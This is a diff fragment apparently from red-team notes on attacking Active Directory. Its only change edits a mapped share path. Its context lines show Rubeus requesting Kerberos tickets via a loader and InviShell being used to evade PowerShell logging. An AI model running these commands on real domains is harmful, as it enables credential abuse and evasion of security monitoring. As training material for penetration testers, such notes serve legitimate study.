@@ -71,7 +71,7 @@ C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:t
 This will create a logon type 9 so the new credentials will only be used when accessing domain resources
 
 ```powershell
-net use A: \\TSCLIENT\Tools
+net use A: \\TSCLIENT\AD
 
 A:\tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
